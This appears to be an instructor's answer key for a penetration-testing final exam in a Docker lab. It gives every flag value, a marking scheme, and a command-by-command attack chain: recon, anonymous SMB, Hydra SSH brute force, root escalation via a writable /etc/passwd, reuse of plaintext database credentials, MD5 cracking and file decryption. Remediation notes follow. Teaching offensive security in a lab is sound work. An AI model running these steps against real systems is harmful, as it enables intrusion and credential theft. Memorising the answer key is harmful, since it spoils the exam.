# Final 2026 — Instructor Walkthrough (ANSWER KEY)

**Do not distribute. Untracked by git even after the exam is released.**

Network: `10.10.12.0/24`. All commands are run from inside
`final2026-attacker` (`docker exec -it final2026-attacker bash`).

| Host | IP | Role |
|------|----|------|
| kali-attacker | 10.10.12.2 | attacker |
| meridian-web | 10.10.12.10 | HTTP (Apache) |
| meridian-fileshare | 10.10.12.11 | SMB (Samba) |
| meridian-app | 10.10.12.12 | SSH + OpenSSL vault |
| meridian-db | 10.10.12.13 | MariaDB |

**All five flags:**
| Flag | Value |
|------|-------|
| 1 | `flag{final2026_web_recon}` |
| 2 | `flag{final2026_smb_share}` |
| 3 | `flag{final2026_ssh_foothold}` |
| 4 | `flag{final2026_root_privesc}` |
| 5 | `flag{final2026_crack_decrypt}` |

---

## Marking distribution (80 marks — practical only)

Award each component for the correct result **and** the commands/evidence
that support it. A flag with no working shown earns partial marks only.

| Phase | Component | Marks |
|-------|-----------|-------|
| **1. Recon & Web (20)** | 1.1 Network & host discovery | 5 |
| | 1.2 Port & service scan — service **and version** on every open port | 7 |
| | 1.3 Web content analysis — **Flag 1** | 4 |
| | 1.4 Username naming convention (+ 3 sample usernames) | 4 |
| **2. SMB (12)** | 2.1 Enumerate shares + state access level | 6 |
| | 2.2 Retrieve the files — **Flag 2** | 6 |
| **3. SSH Foothold (18)** | 3.1 Build targeted username + password lists | 8 |
| | 3.2 Brute force SSH (Hydra) → credentials | 6 |
| | 3.3 Log in — **Flag 3** | 4 |
| **4. Privilege Escalation (14)** | 4.1 Identify the misconfiguration | 6 |
| | 4.2 Exploit to root — **Flag 4** | 8 |
| **5. Reuse / Crack / Decrypt (16)** | 5.1 Find reusable credentials and connect | 6 |
| | 5.2 Extract and crack the hash | 6 |
| | 5.3 Decrypt the file — **Flag 5** | 4 |
| | **Total** | **80** |

---

## Phase 1 — Recon + web (20 marks)

```bash
ip -4 addr                                   # confirm 10.10.12.2/24
nmap -sn 10.10.12.0/24                        # hosts: .10 .11 .12 .13
nmap -sV -p- 10.10.12.10-13                    # 80/http, 139+445/smb, 22/ssh, 3306/mysql
curl -s http://10.10.12.10/                    # staff table + HTML comment
curl -s http://10.10.12.10/ | grep -i flag     # flag in the comment
```

- **1.1 (5):** all four target hosts (.10–.13) found from the attacker's own
  10.10.12.0/24.
- **1.2 (7):** correct service + version on every open port — 80/http (Apache),
  139+445/smb (Samba), 22/ssh (OpenSSH), 3306/mysql (MariaDB), incl. the ones
  not exploited.
- **1.3 (4) — Flag 1:** `flag{final2026_web_recon}` (HTML comment in `index.html`).
- **1.4 (4):** convention = **first initial + surname, lowercase** →
  `smitchell dchen rtan jokoro pnair` (any three valid samples earn it).

## Phase 2 — SMB (12 marks)

```bash
smbclient -L //10.10.12.11 -N                  # share: hr (guest ok)
smbclient //10.10.12.11/hr -N -c 'get IT_onboarding_policy.txt'
cat IT_onboarding_policy.txt
```

- **2.1 (6):** finds the `hr` share and states access is **anonymous / guest**.
- **2.2 (6) — Flag 2:** `flag{final2026_smb_share}` (inside `IT_onboarding_policy.txt`).
  The file also states the policy (temporary password = **Season + Year**) that
  the student needs for Phase 3.

## Phase 3 — Targeted SSH brute force (18 marks)

```bash
printf '%s\n' smitchell dchen rtan jokoro pnair > users.txt
printf '%s\n' Summer2026 Autumn2026 Winter2026 Spring2026 \
             Summer2026! Autumn2026! Winter2026! Spring2026! > pw.txt
hydra -L users.txt -P pw.txt ssh://10.10.12.12 -t 4
# -> [22][ssh] host: 10.10.12.12  login: dchen  password: Winter2026
ssh dchen@10.10.12.12            # password: Winter2026
cat ~/user.txt
```

- **3.1 (8):** a username list from the convention **and** a targeted password
  list from the policy (4 seasons + 2026, ± `!`). Deduct if they just point
  Hydra at full `rockyou.txt`.
- **3.2 (6):** Hydra recovers **dchen : Winter2026** (rtan : Spring2026! is a
  second valid hit; dchen holds the Phase-4/5 material).
- **3.3 (4) — Flag 3:** `flag{final2026_ssh_foothold}` (`/home/dchen/user.txt`).

## Phase 4 — Privilege escalation via world-writable /etc/passwd (14 marks)

Enumeration shows `/etc/passwd` is world-writable (`-rw-rw-rw-`).

```bash
ls -l /etc/passwd                              # -rw-rw-rw-  (the misconfig)
openssl passwd -1 -salt xx pwned               # -> $1$xx$....
echo 'r00t:$1$xx$....:0:0:root:/root:/bin/bash' >> /etc/passwd
su r00t                                         # password: pwned  (LOCAL su)
id                                              # uid=0(root)
cat /root/root.txt
```

Notes:
- Escalate **locally with `su`**, not by SSHing in as the UID-0 account —
  `PermitRootLogin no` is keyed on UID 0, so sshd refuses any uid-0 login.
- Write the hash with **single quotes** (or `$(...)`) so the shell doesn't
  expand the `$1$…` — a double-quoted insert mangles it and `su` then fails.

- **4.1 (6):** identifies the world-writable `/etc/passwd` (`-rw-rw-rw-`).
- **4.2 (8) — Flag 4:** `flag{final2026_root_privesc}` (`/root/root.txt`), via a
  UID-0 entry + local `su`.

## Phase 5 — Credential reuse → crack → decrypt (16 marks)

```bash
cat /opt/scripts/db_backup.sh                   # webuser / Fr3ight_db!2026
# Kali's MariaDB client defaults to requiring TLS; this server offers none,
# so pass --ssl=0 (or --skip-ssl). Single-quote the password (the ! trips bash).
mysql --ssl=0 -h 10.10.12.13 -u webuser -p'Fr3ight_db!2026' -e 'SHOW DATABASES;'
mysql --ssl=0 -h 10.10.12.13 -u webuser -p'Fr3ight_db!2026' company_db -e 'SHOW TABLES;'
mysql --ssl=0 -h 10.10.12.13 -u webuser -p'Fr3ight_db!2026' company_db \
      -e 'SELECT * FROM vault;'
# secret_hash = 0571749e2ac330a7455809c6b0e7af90   (MD5 of 'sunshine')

echo '0571749e2ac330a7455809c6b0e7af90' > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show --format=raw-md5 hash.txt           # -> sunshine

openssl enc -aes-256-cbc -d -salt -in /opt/vault/q4_export.enc -k sunshine
# -> CSV ending in the flag
```

- **5.1 (6):** finds **webuser / Fr3ight_db!2026** in `/opt/scripts/db_backup.sh`
  and connects (needs `--ssl=0`; single-quote the `!`).
- **5.2 (6):** enumerates the DB (`SHOW DATABASES/TABLES`), extracts the MD5
  `0571749e2ac330a7455809c6b0e7af90`, cracks it to **sunshine** with john.
- **5.3 (4) — Flag 5:** `flag{final2026_crack_decrypt}` (decrypted `q4_export.enc`).

---

## Remediation notes (not graded — for written feedback)

- World-writable `/etc/passwd` → `chmod 644`; file-integrity monitoring.
- Reused/weak temp password + SSH password brute force → force password change;
  key-only SSH or lockout/rate-limit.
- Plaintext DB creds in `db_backup.sh`, reused across services → secrets
  manager / restricted `.my.cnf`; least-privilege DB user.
- Weak unsalted MD5 + weak passphrase (`sunshine`) → strong KDF, strong unique
  passphrase.
- Anonymous SMB share leaking the IT policy → require auth; remove sensitive docs.
- Staff list + username convention on the website → strip internal comments.

---

## Reset / re-verify

```bash
docker compose down && docker compose up -d     # fresh stack
docker exec -i final2026-attacker bash -s < solve.sh
```
